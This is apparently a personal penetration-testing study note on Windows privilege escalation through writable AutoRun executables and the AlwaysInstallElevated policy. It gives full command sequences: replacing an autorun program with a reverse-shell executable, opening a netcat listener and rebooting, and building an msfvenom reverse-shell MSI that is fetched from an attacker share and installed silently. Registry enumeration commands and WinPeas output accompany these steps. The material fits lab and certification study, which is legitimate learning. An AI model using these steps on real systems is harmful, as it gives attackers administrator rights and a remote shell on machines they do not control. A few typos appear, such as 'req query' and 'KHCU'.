
#windows #registry #privesc 

# AutoRuns

Windows can be configured to run commands at startup, with elevated privileges.
These "AutoRuns" are configured in the Registry.

If you are able to write to an AutoRun executable, and are able to restart the system ( or wait for it to be restarted ) you may be able to escalate privileges. 

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : For all users
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : For user logged in 

## Commands for registry


```cmd
===>  req query <KEY_PATH> /v <name_value> /s /f <pattern>

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
reg query "HKLM\SOFTWARE" /f "Windows" /s


===> reg add <KEY_PATH> /v <name_value> /t <data_type> /d <data> /f 

reg add "HKCU\Software\TestKey" /v TestValue /t REG_SZ /d "Ceci est une valeur" /f
reg add "HKLM\Software\TestKey" /v TestDWORD /t REG_DWORD /d 1 /f


===> reg delete <KEY_PATH> /v <name_value> /f

reg delete "HKCU\Software\TestKey" /v TestValue /f
reg delete "HKCU\Software\TestKey" /f


===> reg export <KEY_PATH> <Destination_Path> /y 

reg export "HKLM\SOFTWARE\TestKey" C:\Backup\TestKey.reg /y


===> reg import <.reg Path>

reg import C:\Backup\TestKey.reg



===> reg copy <SOURCE_PATH> <DESTINATION_PATH> /s /f 

reg copy "HKCU\Software\TestKey" "HKLM\Software\BackupKey" /s /f



```

#### Output WinPeas Applicationsinfo

```bash
[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


```



## 1- Enumerate manually Autorun 

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

 Result  
```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
Mware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

Checks ACLs of Autorun executables 

```cmd
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

```cmd
icacls "C:\Program Files\Autorun Program\program.exe"
```

```powershell
(Get-Acl "C:\Program Files\Autorun Program\program.exe").Access
```

Here program.exe run as user is logged 

## 2 - Copy payload executable to overwrite the program 

```cmd
copy /Y reverse.exe "C:\Program Files\Autorun Program\Program.exe"
```

## 3 - Set up another listener and restart Windows

```bash
sudo rlwrap nc -lvnp 53 
```

```cmd
shutdown /r /t 0
```

```powershell
Restart-Computer -ComputerName "PcName"
```

```cmd
wmic os where primary=true reboot
```

```cmd
taskkill /IM explorer.exe /F & shutdown /r /t 0
```

On Windows 10 , at least when the system restarts , it seems to run the command with the privileges of the user who was last logged in to avoid this causing issues.
ff
To avoid this causing issues we log out of the user accout and log as the admin account and restart 

# AlwaysInstallElevated

MSI files are packages files used to install appliications.
These files run with the permissions of the user trying to install them.

Windows allows for these installers to be run with elevated ( i.e admin ) privileges.
If this is the case , we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work.
The "AlwaysInstallElevated" Value must be set to 1 for both local machine:

HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

and the current user :

KHCU\SOFTWARE\Policies\Microsoft\Windows\Installer

If either of these are missing or disabled , the exploit will not work 

## 1 - Enumeration WinPeas

On module windowscreds 

```bash
[+] Checking AlwaysInstallElevated(T1012)

    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

```

We can see that both InstallElevatedRegistry keys were found to be enabled.

## 2 - Verify manually 

```cmd 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

==> AlwaysInstallElevated    REG_DWORD    0x1


reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

==> AlwaysInstallElevated    REG_DWORD    0x1

```

## 3 - Exploit

Create a new reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi > reverse.msi
```

Copy and execute-it

```cmd
copy \\<MY-IP>\shares\reverse.msi .
msiexec /quiet /qn /i reverse.msi
```

/quiet no interact user without GUI
/qn ( Quiet None ) : Delete all dialog boxes or windows 
/i : install a folder

